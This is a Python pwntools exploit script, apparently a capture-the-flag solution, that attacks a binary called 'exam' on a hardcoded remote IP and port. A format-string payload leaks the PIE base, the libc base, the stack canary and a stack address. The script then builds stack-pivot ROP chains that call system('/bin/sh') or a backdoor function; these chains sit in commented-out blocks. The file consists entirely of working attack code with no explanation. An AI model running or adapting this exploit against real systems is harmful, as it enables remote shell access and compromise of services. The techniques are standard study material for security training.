from pwn import *
elf=ELF("exam")
#io=elf.process()
io=remote("123.207.32.26",9002)
libc=elf.libc
#libc=ELF("")
context.log_level='debug'

sla=io.sendlineafter
sl=io.sendline
sa=io.sendafter
ru=io.recvuntil
shell=io.interactive

def menu(choice):
	sla("room",str(choice))

def write(payload):
	menu(2)
	sa("paper:\n",payload)
	sla("[Y/N]\n",'Y')

def ask(payload):
	menu(3)
	sa("question?\n",payload)

csu_init=0x15f0
backdoor=0x11c5
bss=0x4040
leave_ret=0x12c5
pop_rdi=0x164b
point=0x4014

#gdb.attach(io)
payload='%24$paaa%13$pbbb%19$pccc%20$pddd'
ask(payload)
ru("is : ")
#leak PIE
csu_init_addr=int(ru("aaa",True),16)
pie=csu_init_addr-csu_init
print "pie:"+hex(pie)
#leak libc
puts_addr=int(ru("bbb",True),16)
puts_addr=puts_addr-362
libcbase=puts_addr-libc.sym['puts']
print "libcbase:"+hex(libcbase)
libc.address=libcbase
#leak canary
canary=int(ru('ccc',True),16)
print 'canary:'+hex(canary)
#leak stack
target=int(ru('ddd',True),16)
target-=0x90
print 'target:'+hex(target)

#1:stack pivot+ret2libc
'''
payload=p64(1)
payload+=p64(pie+pop_rdi)
payload+=p64(libc.search('/bin/sh').next())
payload+=p64(libc.sym['system'])
payload+='\x90'*(0x68-len(payload))
payload+=p64(canary)
payload+=p64(target)
payload+=p64(pie+leave_ret)
write(payload)
shell()
'''
'''
#2:fmtstr+stack pivot+backdoor
payload='%666c%8$hn'
payload+=(16-len(payload))*'a'
payload+=p64(pie+point)
ask(payload)
payload=p64(1)
payload+=p64(pie+pop_rdi)
payload+=p64(30)
payload+=p64(pie+backdoor)
payload+='\x90'*(0x68-len(payload))
payload+=p64(canary)
payload+=p64(target)
payload+=p64(pie+leave_ret)
write(payload)
print io.recv()
'''

